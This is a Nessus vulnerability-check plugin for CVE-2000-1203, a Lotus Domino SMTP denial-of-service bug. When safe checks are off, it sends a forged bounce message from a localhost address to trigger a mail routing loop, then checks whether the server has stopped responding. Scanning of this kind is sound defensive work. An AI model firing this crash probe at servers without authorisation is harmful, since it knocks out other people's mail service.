#
# (C) Tenable Network Security, Inc.
#

# References
# Date:  Mon, 20 Aug 2001 21:19:32 +0000
# From: "Ian Gulliver" <ian@orbz.org>
# To: bugtraq@securityfocus.com
# Subject: Lotus Domino DoS
#


include("compat.inc");

if(description)
{
 script_id(11717);
 script_version ("$Revision: 1.18 $");
 script_cve_id("CVE-2000-1203");
 script_bugtraq_id(3212);
 script_osvdb_id(10816);

 script_name(english:"Lotus Domino SMTP Server Forged Localhost Mail Header DoS");
 
 script_set_attribute(attribute:"synopsis", value:
"The remote SMTP server is affected by a denial of service 
vulnerability." );
 script_set_attribute(attribute:"description", value:
"The remote SMTP server (possibly Lotus Domino) can be killed or 
disabled by a malformed message that bounces to itself. The 
routing loop exhausts all resources.

An attacker may use this to crash it continuously." );
 script_set_attribute(attribute:"see_also", value:"http://marc.info/?l=vuln-dev&m=95886062521327&w=2" );
 script_set_attribute(attribute:"solution", value:
"Upgrade to Domino 5.0.9 or newer." );
 script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:N/I:N/A:P");
 script_set_cvss_temporal_vector("CVSS2#E:U/RL:W/RC:C");
 script_set_attribute(attribute:"exploitability_ease", value:"No known exploits are available");
 script_set_attribute(attribute:"exploit_available", value:"false");

 script_set_attribute(attribute:"plugin_publication_date", value: "2003/06/11");
 script_set_attribute(attribute:"vuln_publication_date", value: "2001/08/20");
 script_cvs_date("$Date: 2012/08/09 22:01:45 $");
script_set_attribute(attribute:"plugin_type", value:"remote");
script_set_attribute(attribute:"cpe",value:"cpe:/a:ibm:lotus_domino");
script_end_attributes();

 
 script_summary(english:"Broken message bounced to himself exhausts MTA");
 script_category(ACT_MIXED_ATTACK);
 script_copyright(english:"This script is Copyright (C) 2003-2012 Tenable Network Security, Inc.");
 script_family(english:"SMTP problems");

 # Avoid this test if the server relays e-mails.
 script_dependencie("smtpserver_detect.nasl", "smtp_settings.nasl",
	"smtp_relay.nasl", "smtpscan.nasl");
 script_require_ports("Services/smtp", 25);
 exit(0);
}

#
include("global_settings.inc");
include("misc_func.inc");
include("smtp_func.inc");

port = get_service(svc:"smtp", default: 25, exit_on_fail: 1);
if (get_kb_item("SMTP/"+port+"/broken")) exit(0);

buff = get_smtp_banner(port:port);

if ( ! buff || "Lotus Domino" >!< buff ) exit(0);

# Disable the test if the server relays e-mails or if safe checks
# are enabled
if (get_kb_item("SMTP/" + port + "/spam") ||  safe_checks())
{
  if(egrep(pattern:"^220.*Lotus Domino Release ([0-4]\.|5\.0\.[0-8][^0-9])", string:buff))
  {
   security_warning(port);
   exit(0);
  }
  
  # Use smtpscan's banner.
  if (report_paranoia > 1)
  {
  banner = get_kb_item(string("smtp/", port, "/real_banner"));
  if(!isnull(banner) && ereg(pattern:"Lotus.* ([0-4]\.|5\.0\.[0-8][^0-9])", string:banner)) {
  	security_warning(port);
   	exit(0);
   }
  }
  exit(0);
}

#
n_sent = 0;

fromaddr = string("bounce", rand(), "@[127.0.0.1]");
toaddr = string("nessus", rand(), "@invalid", rand(), ".net");


 s = open_sock_tcp(port);
 if(!s)exit(0);
  
  
buff = smtp_recv_banner(socket:s);

b = 
 'From: nessus\r\n' +
 'To: postmaster\r\n' +
 'Subject: SMTP bounce denial of service\r\n\r\n' +
 'test\r\n';

n = smtp_send_port(port: port, from: fromaddr, to: toaddr, body: b);
if (! n) exit(0);
sleep(1);

flag = 1;
soc = open_sock_tcp(port);
if (soc)
{
  send(socket: soc, data: 'HELO example.com\r\n');
  buff = recv_line(socket: soc, length: 2048);
  if (buff =~ "^2[0-9][0-9] ")
    flag = 0;
  smtp_close(socket: soc);
}
if (flag) security_warning(port);
